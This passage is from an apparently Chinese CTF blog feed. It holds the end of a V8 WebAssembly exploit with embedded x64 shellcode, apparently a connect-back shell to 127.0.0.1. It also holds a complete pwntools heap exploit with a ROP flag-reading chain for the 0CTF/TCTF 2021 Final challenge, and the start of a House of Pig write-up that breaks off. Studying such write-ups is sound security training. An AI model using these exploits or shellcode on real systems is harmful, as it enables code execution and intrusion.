wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> f_addr = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + <span class="title function_">hex</span>(f_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read64</span>(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = <span class="title function_">read64</span>(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = <span class="title function_">read64</span>(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title function_">read64</span>(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="title function_">hex</span>(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(f);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* /bin/sh for linux x64</span></span><br><span class="line"><span class="comment"> char shellcode[] = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;;</span></span><br><span class="line"><span class="comment">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*var shellcode = [</span></span><br><span class="line"><span class="comment">    0x2fbb485299583b6an,</span></span><br><span class="line"><span class="comment">    0x5368732f6e69622fn,</span></span><br><span class="line"><span class="comment">    0x050f5e5457525f54n</span></span><br><span class="line"><span class="comment">];*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line"><span class="number">0x6a5f026a9958296an</span>,</span><br><span class="line"><span class="number">0xb9489748050f5e01n</span>,</span><br><span class="line"><span class="number">0x100007f3d0d0002n</span>,</span><br><span class="line"><span class="number">0x6a5a106ae6894851n</span>,</span><br><span class="line"><span class="number">0x485e036a050f582an</span>,</span><br><span class="line"><span class="number">0x75050f58216aceffn</span>,</span><br><span class="line"><span class="number">0x2fbb4899583b6af6n</span>,</span><br><span class="line"><span class="number">0x530068732f6e6962n</span>,</span><br><span class="line"><span class="number">0xe689485752e78948n</span>,</span><br><span class="line"><span class="number">0x909090909090050fn</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span>*<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write64</span>(buf_backing_store_addr, rwx_page_addr);  <span class="comment">//这里写入之前泄露的rwx_page_addr地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shellcode length: &quot;</span> + <span class="title function_">hex</span>(shellcode.<span class="property">length</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;now i: &quot;</span> + <span class="title function_">hex</span>(i));</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> V8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021 0CTF/TCTF Final Naive Heap</title>
      <link href="/posts/1864456601.html"/>
      <url>/posts/1864456601.html</url>
      
        <content type="html"><![CDATA[<p>佛系做题，没想到在RingStar的队伍中拿了这个题目的一血，但是隔壁国际赛的blasn战队好像早就出了。最终RingStar和国际赛道的队伍总共有5支做出来了。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2021-OCTF-TCTF-Final-Naive-Heap/2021TCTF%20Final.jpeg"></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2021-OCTF-TCTF-Final-Naive-Heap/2021TCTFNation.jpeg"></p><p>其实题目也是比较简单的。</p><blockquote><p>唔，补充一下，这里我看了r3的wp，发现和我做的不一样，我这里是直接释放的main_arena中保存的top chunk，上下两个相邻的size都是可以通过申请堆块进行伪造的，这样就很容易完成堆重叠的构造了。之后堆风水，泄漏地址，执行rop。</p><p>但是r3这里是直接释放的libc前面应该是mmap的一段内存空间中保存的pthread_tcache_struct结构体指针，我在做题的时候只找了libc里面的指针，并没有注意到这块内存。这里在释放pthread_tcache_struct之后就可以很容易的改写fd，然后任意地址分配了，也很方便。</p><p>有大佬知道libc前面这段内存是怎么回事请教教弟弟</p></blockquote><p>我的EXP如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"><span class="keyword">import</span> syslog</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./share/chall&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;1.117.189.158&quot;</span>, <span class="number">60001</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ma_free</span>(<span class="params">size, content=<span class="string">b&quot;\n&quot;</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">top_chunk = <span class="number">0x14e390</span></span><br><span class="line">top_chunk_size = <span class="number">0x1c3f0</span></span><br><span class="line">stdout = <span class="number">0x36a0</span></span><br><span class="line">heap_base = <span class="number">0x3000</span></span><br><span class="line">free_hook = <span class="number">0x5b28</span></span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0x78</span>, p64(<span class="number">0x521</span>)*<span class="built_in">int</span>(<span class="number">0x78</span> / <span class="number">0x8</span>))</span><br><span class="line">ma_free(<span class="number">0x520</span>, p64(<span class="number">0x21</span>) * <span class="built_in">int</span>(<span class="number">0x520</span>/<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(top_chunk/<span class="number">8</span>)))</span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0x38</span>)</span><br><span class="line">ma_free(<span class="number">0x98</span>)</span><br><span class="line">ma_free(<span class="number">0x78</span>, p64(<span class="number">0x3e1</span>)*<span class="built_in">int</span>(<span class="number">0x78</span> / <span class="number">0x8</span>))</span><br><span class="line">ma_free(<span class="number">0x38</span>)</span><br><span class="line">ma_free(<span class="number">0xa8</span>)</span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0x380</span>)</span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span> + p64(<span class="number">0xb1</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ma_free(<span class="number">0x98</span>)</span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p8(<span class="number">0</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span> + p64(<span class="number">0xa1</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ma_free(<span class="number">0xa8</span>)</span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x38</span> + p64(<span class="number">0x391</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ma_free(<span class="number">0x98</span>)</span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x40</span> + p16(heap_base + <span class="number">0xd0</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0xa8</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(top_chunk_size) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x1000</span>/<span class="number">0x8</span>) - <span class="number">1</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0x50</span>)</span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x1011</span>-<span class="number">0x30</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ma_free(<span class="number">0x380</span>)</span><br><span class="line">ma_free(<span class="number">0x390</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x38</span>)</span><br><span class="line">heap_address = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">p.recv(<span class="number">0x390</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">96</span></span><br><span class="line">p.recv()</span><br><span class="line">log.success(<span class="string">&quot;heap address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x391</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ma_free(<span class="number">0x390</span>)</span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x391</span>) + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ma_free(<span class="number">0x3d0</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x3a1</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ma_free(<span class="number">0x380</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">magic = libc.address + <span class="number">0x0000000000154930</span></span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000026b72</span> + libc.address</span><br><span class="line">p_rsi_r = <span class="number">0x0000000000027529</span> + libc.address</span><br><span class="line">p_rdx_r12_r = <span class="number">0x000000000011c371</span> + libc.address</span><br><span class="line">p_rax_r = <span class="number">0x000000000004a550</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x0000000000066229</span> + libc.address</span><br><span class="line">ret_add = <span class="number">0x0000000000025679</span> + libc.address</span><br><span class="line"></span><br><span class="line">orw_address = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0xb0</span></span><br><span class="line">flag_str_address = orw_address + <span class="number">0x150</span></span><br><span class="line">flag_address = orw_address + <span class="number">0x150</span></span><br><span class="line">orw = flat([</span><br><span class="line">    p_rdi_r, flag_str_address,</span><br><span class="line">    p_rsi_r, <span class="number">0</span>,</span><br><span class="line">    p_rax_r, <span class="number">2</span>,</span><br><span class="line">    syscall, <span class="comment"># open(flag_str_address, 0)</span></span><br><span class="line">    p_rdi_r, <span class="number">3</span>,</span><br><span class="line">    p_rsi_r, flag_address,</span><br><span class="line">    p_rdx_r12_r, <span class="number">0x30</span>, <span class="number">0</span>,</span><br><span class="line">    p_rax_r, <span class="number">0</span>,</span><br><span class="line">    syscall, <span class="comment"># read(3, flag_address, 0x30)</span></span><br><span class="line">    p_rdi_r, <span class="number">1</span>,</span><br><span class="line">    p_rsi_r, flag_address,</span><br><span class="line">    p_rdx_r12_r, <span class="number">0x30</span>, <span class="number">0</span>,</span><br><span class="line">    p_rax_r, <span class="number">1</span>,</span><br><span class="line">    syscall <span class="comment"># write(1, flag_address, 0x30)</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">payload = p64(magic) + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(orw_address) + p64(ret_add)</span><br><span class="line">payload += orw.ljust(<span class="number">0x150</span>, <span class="string">b&quot;\x00&quot;</span>) + <span class="string">b&quot;flag-03387efa-0ad7-4aaa-aae0-e44021ad310a\n&quot;</span></span><br><span class="line"></span><br><span class="line">ma_free(<span class="number">0x380</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机逃逸&amp;漏洞复现</title>
      <link href="/posts/2427305175.html"/>
      <url>/posts/2427305175.html</url>
      
        <content type="html"><![CDATA[<h1 id="2020-Plaid-CTF-mojo-Sandbox-Escape"><a href="#2020-Plaid-CTF-mojo-Sandbox-Escape" class="headerlink" title="2020 Plaid CTF mojo Sandbox Escape"></a>2020 Plaid CTF mojo Sandbox Escape</h1><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020PlaidCTF-mojo.jpg"></p><h1 id="2018-Google-CTF-Just-in-time-优化错误导致OOB"><a href="#2018-Google-CTF-Just-in-time-优化错误导致OOB" class="headerlink" title="2018 Google CTF Just-in-time 优化错误导致OOB"></a>2018 Google CTF Just-in-time 优化错误导致OOB</h1><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/google-ctf-just-in-time.gif"></p><h1 id="CVE-2018017463-Chrome-V8-JIT优化错误漏洞"><a href="#CVE-2018017463-Chrome-V8-JIT优化错误漏洞" class="headerlink" title="CVE-2018017463 Chrome V8 JIT优化错误漏洞"></a>CVE-2018017463 Chrome V8 JIT优化错误漏洞</h1><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/cve-2018-17463.gif"></p><h2 id="CVE-2021-22555-Linux-Kernel-Netfilter-越界写0漏洞"><a href="#CVE-2021-22555-Linux-Kernel-Netfilter-越界写0漏洞" class="headerlink" title="CVE-2021-22555 Linux Kernel Netfilter 越界写0漏洞"></a>CVE-2021-22555 Linux Kernel Netfilter 越界写0漏洞</h2><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/cve-2021-22555.gif"></p><h2 id="2021-强网杯线下赛-VGA"><a href="#2021-强网杯线下赛-VGA" class="headerlink" title="2021 强网杯线下赛 VGA"></a>2021 强网杯线下赛 VGA</h2><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2021%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9BVGA.gif"></p><h2 id="2020-强网杯线下赛-VbEscape"><a href="#2020-强网杯线下赛-VbEscape" class="headerlink" title="2020 强网杯线下赛 VbEscape"></a>2020 强网杯线下赛 VbEscape</h2><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8BVbEscape.gif"></p><h2 id="2018-35C3-CTF-Chromacity"><a href="#2018-35C3-CTF-Chromacity" class="headerlink" title="2018 35C3 CTF Chromacity"></a>2018 35C3 CTF Chromacity</h2><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2018%2035C3%20CTF%20Chromacity.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021 XCTF Final 线下WP</title>
      <link href="/posts/3705072996.html"/>
      <url>/posts/3705072996.html</url>
      
        <content type="html"><![CDATA[<h1 id="2021-XCTF-Final-线下WP"><a href="#2021-XCTF-Final-线下WP" class="headerlink" title="2021 XCTF Final 线下WP"></a>2021 XCTF Final 线下WP</h1><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2021%20XCTF%20Final%20%E7%BA%BF%E4%B8%8BWP/Untitled.png" alt="2021%20XCTF%20Final%20%E7%BA%BF%E4%B8%8BWP%204cdef728b74246ab96b85471d5d8a5bc/Untitled.png"></p><p>哎呀妈呀，太肝了，感觉我都要升仙了。</p><h2 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h2><p>GLIBC 2.31</p><p>这个题目主要考察的其实是TCTF2020中duet技术相关的部分。作者提出了一个House of Pig的新的利用方式，但是这中方式之前已经见到过了，就是kirin在duet中使用到的技术</p><p><a href="https://kirin-say.top/2020/06/29/0CTF-TCTF-2020-Quals-PWN/">0CTF/TCTF 2020 Quals PWN</a></p><p><a href="https://www.anquanke.com/post/id/242640">官方的WP</a></p><p>程序实现很复杂，实现了三种不同的操作方式即三种add，三种edit和三种show，三种功能delete，每种操作方式对应的buf_list是不同的。用户可以进行切换操作方式，在切换的时候程序会将当前操作方式所对应的buf_list等信息拷贝到一个map的地址空间中，我称之为备份。三种不同的操作方式的备份的地址空间是不同的。因此这里不存在备份冲突的情况。</p><p>直觉上来讲肯定是进行切换时候发生了问题，因此这里仔细的分析一下切换时候的操作。注意到这里的ida分析不出jmp eax的情况，因此这里使用ghrida来进行分析的。在进行状态切换的时候会check pass，这里的pass和切换的index是对应的，并且这里的pass是经过md5加密的。这里我没有看解密的操作。一开始是直接改check_pass函数的返回值来进行调试的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">  iVar2 = checkpass();</span><br><span class="line">  <span class="keyword">if</span> ((iVar2 != <span class="number">0</span>) &amp;&amp; (iVar2 != local_428)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (local_428 == <span class="number">1</span>) &#123;</span><br><span class="line">      save_array_2_map_1(local_420);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (local_428 == <span class="number">2</span>) &#123;</span><br><span class="line">        save_array_2_map_2(local_420);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (local_428 == <span class="number">3</span>) &#123;</span><br><span class="line">          save_array_2_map_3(local_420);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_428 = iVar2;</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">1</span>) &#123;</span><br><span class="line">      pbVar3 = <span class="built_in">std</span>::operator&lt;&lt;((basic_ostream *)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,<span class="string">&quot;This is Peppa Pig~&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;</span><br><span class="line">                ((basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt; *)pbVar3,</span><br><span class="line">                 <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      local_420 = local_418;</span><br><span class="line">      copy_map_2_array_1(local_420);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (iVar2 == <span class="number">2</span>) &#123;</span><br><span class="line">        pbVar3 = <span class="built_in">std</span>::operator&lt;&lt;((basic_ostream *)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,<span class="string">&quot;This is Mummy Pig~&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;</span><br><span class="line">                  ((basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt; *)pbVar3,</span><br><span class="line">                   <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        local_420 = local_2c8;</span><br><span class="line">        copy_map_2_array_2(local_420);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (iVar2 == <span class="number">3</span>) &#123;</span><br><span class="line">          pbVar3 = <span class="built_in">std</span>::operator&lt;&lt;((basic_ostream *)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,<span class="string">&quot;This is Daddy Pig~&quot;</span>);</span><br><span class="line">          <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;</span><br><span class="line">                    ((basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt; *)pbVar3,</span><br><span class="line">                     <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">          local_420 = local_178;</span><br><span class="line">          copy_map_2_array_3(local_420);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里首先将当前模式的相关的信息保存早map中，然后根据check_pass的结果将对应模式的信息拷贝到栈中，这样就完成了状态的切换。但是在进行拷贝的时候会出现一个问题，save和recover的信息不对等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 